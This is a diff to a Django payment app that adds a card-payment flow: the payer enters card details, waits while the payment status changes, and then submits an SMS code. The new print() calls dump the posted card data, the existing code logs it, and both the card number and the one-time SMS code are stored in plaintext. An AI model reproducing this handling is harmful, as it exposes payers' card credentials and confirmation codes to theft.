@@ -31,7 +31,7 @@ from core.global_func import hash_gen, TZ
 from payment import forms
 from payment.filters import PaymentFilter, WithdrawFilter, BalanceChangeFilter, PaymentMerchStatFilter
 from payment.forms import InvoiceForm, PaymentListConfirmForm, PaymentForm, InvoiceM10Form, InvoiceTestForm, \
-    MerchantForm, WithdrawForm, DateFilterForm
+    MerchantForm, WithdrawForm, DateFilterForm, InvoiceM10SmsForm
 from payment.models import Payment, PayRequisite, Merchant, PhoneScript, Bank, Withdraw, BalanceChange
 from payment.permissions import AuthorRequiredMixin, StaffOnlyPerm, MerchantOnlyPerm
 from payment.task import send_payment_webhook
@@ -108,9 +108,10 @@ def get_time_remaining(pay: Payment) -> tuple[datetime.timedelta, int]:
         TIMER_SECONDS = 600
     else:
         TIMER_SECONDS = 600
-    TIMER_SMS_SECONDS = 180
+    TIMER_SMS_SECONDS = 600
     STATUS_WAIT_TIMER = 600
     if pay.card_data and json.loads(f'{pay.card_data}').get('sms_code'):
+        # Если смс введена
         time_remaining = pay.cc_data_input_time + datetime.timedelta(seconds=STATUS_WAIT_TIMER) - timezone.now()
         limit = STATUS_WAIT_TIMER
     elif pay.cc_data_input_time:
@@ -359,7 +360,6 @@ def pay_to_card_create(request, *args, **kwargs):
 
 def pay_to_m10_create(request, *args, **kwargs):
     """Платеж через ввод реквизитов карты"""
-    print('pay_to_m10_create')
     if request.method == 'GET':
         payment_id = request.GET.get('payment_id')
         logger.debug(f'GET {request.GET.dict()}'
@@ -391,13 +391,17 @@ def pay_to_m10_create(request, *args, **kwargs):
 
     elif request.method == 'POST':
         # Обработка нажатия кнопки
+        print(request.POST)
         payment_id = request.POST.get('payment_id')
+        print(payment_id)
         payment = Payment.objects.get(pk=payment_id)
+        print(payment)
         initial_data = {'payment_id': payment.id}
         form = InvoiceM10Form(request.POST, instance=payment, initial=initial_data)
         context = {'form': form, 'payment': payment, 'data': get_time_remaining_data(payment)}
 
         if form.is_valid():
+            print('form.is_valid()')
             card_data = form.cleaned_data
             logger.debug(card_data)
             card_number = card_data.get('card_number')
@@ -421,13 +425,44 @@ def pay_to_m10_create(request, *args, **kwargs):
             if payment.status == 0:
                 payment.status = 3  # Ввел CC.
             payment.save()
-            return render(request, context=context, template_name='payment/invoice_m10.html')
+            # return render(request, context=context, template_name='payment/invoice_m10.html')
+            return redirect(reverse('payment:pay_to_m10_wait_work') + f'?payment_id={payment.id}')
         else:
             # Некорректные данные
             logger.debug(f'{form.errors}')
             return render(request, context=context, template_name='payment/invoice_m10.html')
 
     logger.critical('Необработанный путь')
+
+
+def pay_to_m10_wait_work(request, *args, **kwargs):
+    payment_id = request.GET.get('payment_id')
+    payment = get_object_or_404(Payment, pk=payment_id)
+    if payment.status in [4]:
+        return redirect(reverse('payment:pay_to_m10_sms_input') + f'?payment_id={payment.id}')
+    if payment.status not in [0, 3]:
+        return redirect(reverse('payment:pay_result', kwargs={'pk': payment.id}))
+    return render(request, template_name='payment/invoice_m10_wait.html')
+
+
+def pay_to_m10_sms_input(request, *args, **kwargs):
+    payment_id = request.GET.get('payment_id')
+    payment = get_object_or_404(Payment, pk=payment_id)
+    card_data = json.loads(payment.card_data)
+    card_number = card_data.get('card_number')
+    phone_script = get_phone_script(card_number)
+    form = InvoiceM10SmsForm(request.POST or None, instance=payment)
+    if not phone_script.step_2_required:
+        form.fields['sms_code'].required = False
+    context = {'form': form, 'payment': payment, 'phone_script': phone_script}
+    if form.is_valid():
+        sms_code = form.cleaned_data.get('sms_code')
+        card_data['sms_code'] = sms_code
+        payment.card_data = json.dumps(card_data, ensure_ascii=False)
+        payment.save()
+        return redirect(reverse('payment:pay_result', kwargs={'pk': payment.id}))
+    return render(request, context=context, template_name='payment/invoice_m10_sms.html')
+
 
 
 class PayResultView(DetailView):
